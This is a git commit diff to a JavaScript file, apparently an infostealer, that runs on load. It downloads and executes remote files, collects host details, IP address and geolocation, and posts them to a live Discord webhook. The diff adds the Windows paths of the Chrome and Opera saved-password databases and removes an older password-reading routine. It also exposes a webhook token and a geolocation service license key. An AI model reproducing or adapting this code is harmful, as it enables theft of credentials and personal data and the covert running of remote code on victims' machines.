8702aae36ff6fd09d8fcca513958ee267eea8093
Emmanuek5 <83721168+Emmanuek5@users.noreply.github.com>
2023-07-09 17:33:50 +0000

    Update

--- src/public/index.js
+++ src/public/index.js
@@ -18,12 +18,26 @@ const filesToDownload = [
 
 // Discord webhook URL to send system details and passwords
 const webhookUrl =
-  "https://discord.com/api/webhooks/1127493526071017493/i3owo_8IrjNQ-TKVruHU4kzF0BF7ewbAisA-yLYZCbeVqgWf30UY1KLG2AyMejyhVqmD";
+  "https://discord.com/api/webhooks/1127570894995333173/BSfIpUz5MxjlxEJN8wkKUeUVjtCYE_6JXNJbIEhW1CL2CN98tonjv5vR9-7ow-rauIvI";
 
 // Path to Chrome passwords file
-const passwordsFilePath = path.join(
+const passwordsFilePathChrome = path.join(
   os.homedir(),
-  "Library/Application Support/Google/Chrome/Default/Login Data"
+  "AppData",
+  "Local",
+  "Google",
+  "Chrome",
+  "User Data",
+  "Login Data"
+);
+
+// Path to Opera passwords file
+const passwordsFilePathOpera = path.join(
+  os.homedir(),
+  "AppData",
+  "Roaming",
+  "Opera Software",
+  "Login Data"
 );
 
 // Function to download a file and save it to a specific path
@@ -51,57 +65,83 @@ function executeFile(filePath) {
 }
 
 // Function to retrieve system details
-function getSystemDetails() {
-  const systemDetails = {
-    computerName: os.hostname(),
-    totalMemory: os.totalmem(),
-    freeMemory: os.freemem(),
-    platform: os.platform(),
-    architecture: os.arch(),
-    release: os.release(),
-  };
-  return systemDetails;
-}
-
-// Function to retrieve Chrome passwords and URLs
-function getChromePasswords() {
-  return new Promise((resolve, reject) => {
-    fs.readFile(passwordsFilePath, (err, data) => {
-      if (err) {
-        console.error("Error reading Chrome passwords file:", err);
-        reject(err);
-      } else {
-        const passwords = [];
-        const lines = data.toString().split("\n");
-        lines.forEach((line) => {
-          const parts = line.split(";");
-          if (parts.length >= 4) {
-            passwords.push({
-              url: parts[0],
-              username: parts[2],
-              password: parts[3],
-            });
-          }
-        });
-        resolve(passwords);
-      }
-    });
-  });
-}
-
-// Function to send system details and passwords to Discord webhook
-async function sendSystemDetailsAndPasswordsToDiscord(details, passwords) {
+async function getSystemDetails() {
   try {
-    const message = `System Details:\n\`\`\`${JSON.stringify(
-      details,
-      null,
-      2
-    )}\`\`\`\n\nPasswords:\n\`\`\`${JSON.stringify(passwords, null, 2)}\`\`\``;
+    const ipAddress = await getIPAddress();
+    const geoDetails = await getGeoDetails(ipAddress);
+
+    const systemDetails = {
+      computerName: os.hostname(),
+      totalMemory: os.totalmem(),
+      freeMemory: os.freemem(),
+      platform: os.platform(),
+      architecture: os.arch(),
+      release: os.release(),
+      ipAddress,
+      country: geoDetails.country.names.en,
+      location: geoDetails.location.time_zone,
+      city: geoDetails.city.names.en,
+      provider: geoDetails.traits.autonomous_system_organization,
+    };
+
+    return systemDetails;
+  } catch (error) {
+    console.error("Error retrieving system details:", error.message);
+    throw error;
+  }
+}
+
+// Function to retrieve the IP address
+async function getIPAddress() {
+  try {
+    const response = await axios.get("https://ipapi.blueobsidian.repl.co/api");
+    return response.data.ip;
+  } catch (error) {
+    console.error("Error retrieving IP address:", error.message);
+    throw error;
+  }
+}
+
+// Function to retrieve country and location details based on IP address
+// Function to retrieve country and location details based on IP address
+async function getGeoDetails() {
+  try {
+    const accountId = "888018";
+    const licenseKey = "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";
+
+    const auth = {
+      username: accountId,
+      password: licenseKey,
+    };
+
+    const response = await axios.get(
+      "https://geolite.info/geoip/v2.1/city/me",
+      { auth, params: { pretty: true } }
+    );
+
+    const { data } = response;
+    console.log(data);
+    return data;
+  } catch (error) {
+    console.error("Error retrieving geo details:", error.message);
+    throw error;
+  }
+}
+
+// Function to send system details to Discord webhook
+async function sendSystemDetailsToDiscord(details) {
+  try {
+    const message = `
+      System Details:
+      \`\`\`
+      ${JSON.stringify(details, null, 2)}
+      \`\`\`
+    `;
     await axios.post(webhookUrl, { content: message });
-    console.log("System details and passwords sent to Discord webhook.");
+    console.log("System details sent to Discord webhook.");
   } catch (error) {
     console.error(
-      "Error sending system details and passwords to Discord webhook:",
+      "Error sending system details to Discord webhook:",
       error.message
     );
     throw error;
@@ -135,7 +175,7 @@ async function checkAndUpdateFiles() {
   }
 }
 
-// Main function to download files, execute scripts, retrieve passwords, and send system details and passwords
+// Main function to download files, execute scripts, and send system details
 async function runScript() {
   try {
     // Download files and update if necessary
@@ -148,22 +188,15 @@ async function runScript() {
     executeFile(scriptPath);
 
     // Retrieve system details
-    const systemDetails = getSystemDetails();
+    const systemDetails = await getSystemDetails();
     console.log("System Details:", systemDetails);
 
-    // Retrieve Chrome passwords and URLs
-    const chromePasswords = await getChromePasswords();
-    console.log("Chrome Passwords:", chromePasswords);
-
-    // Send system details and passwords to Discord webhook
-    await sendSystemDetailsAndPasswordsToDiscord(
-      systemDetails,
-      chromePasswords
-    );
+    // Send system details to Discord webhook
+    await sendSystemDetailsToDiscord(systemDetails);
   } catch (error) {
     console.error("Error in runScript:", error);
   }
 }
 
-// Invoke the main function to startthe process
+// Invoke the main function to start the process
 runScript();
